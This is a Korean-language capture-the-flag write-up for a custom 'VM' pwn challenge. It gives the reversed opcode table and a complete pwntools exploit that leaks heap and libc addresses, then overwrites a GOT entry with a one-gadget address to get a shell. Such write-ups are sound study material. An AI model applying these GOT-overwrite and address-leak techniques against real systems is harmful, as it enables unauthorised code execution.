VM (pwn)
=============

### 1. Introduction

VM은 처음풀어봤는데 은근 재미있었지만 삽질을 너무 많이하고 비효율적으로 풀었다.

### 2. Solve
```
# 0000     00    000 000  1111   0000000000000000
# idx  condition src dst   fix        value

idx
0 -> info
1 -> mov
2 -> add
3 -> sub
4 -> xor
5 -> swap
6 -> ++
7 -> --
8 -> push
9 -> pop
10 -> syscall
```

리버싱해서 위 정보만 알아내면 나머지는 쉽다.
그냥 sp를 got로 바꾸고 leak을 한뒤 push로 oneshot을 넣어서 트리거하면된다.
bad_system_call의 got를 덮었다.

```python
from pwn import *

s = process('./VM')
e = ELF('/lib/x86_64-linux-gnu/libc.so.6')

i2b = lambda x: str(bin(x)[2:])

def ins(_idx, _condition, _src, _dst,_val):
	idx = i2b(_idx).rjust(4,'0')
	con = i2b(_condition).rjust(2,'0')
	src = i2b(_src).rjust(3,'0')
	dst = i2b(_dst).rjust(3,'0')
	fix = '1111'
	val = i2b(_val).rjust(16,'0')
	return hex(int('0b' + idx + con + src + dst + fix + val,2))[2:]

info = '0fff0000'
bad_function_call_got = 0x60C0D8

pause()
s.recvuntil('hi')

payload = ins(1,1,7,1,0x4000)
payload += info

s.sendline(payload)

# heap leak
s.recvuntil('0x4020 ')
leak = s.recv(11).split()
leak.reverse()
heap_base = int("".join(leak),16) - 0x4070
offset = (1<<32) - (heap_base - bad_function_call_got)
off1 = offset / 0x10000
off2 = offset % 0x10000

log.info("HEAP BASE : " + hex(heap_base))
log.info("OFFSET1,OFFSET2 : " + hex(off1) + "," + hex(off2))

payload = ins(1,1,7,1,0x4020)
payload += ins(8,3,7,1,off1)
if off2 > 0x401e :
	payload += ins(2,1,7,1, off2 - 0x401e - 0x40)
else :
	s.failure('FAIL!')
	exit()
payload += info

s.sendline(payload)

# libc leak
s.recvuntil('[+] register info')
s.recvuntil('0x')
leak = s.recv(26)[8:].split()
leak.reverse()
libc_base = int("".join(leak),16) - e.symbols['ntohl']
oneshot = libc_base + 0x4526a

log.info("LIBC BASE : " + hex(libc_base))

# overwrite bad system call got
payload = ins(2,1,7,1,6)
payload += ins(8,3,7,1, oneshot / 0x100000000)
payload += ins(8,3,7,1, oneshot % 0x100000000 / 0x10000)
payload += ins(8,3,7,1, oneshot % 0x10000)

s.sendline(payload)

payload = ins(0xa,3,0,0,0)
s.sendline(payload)

s.interactive()
```
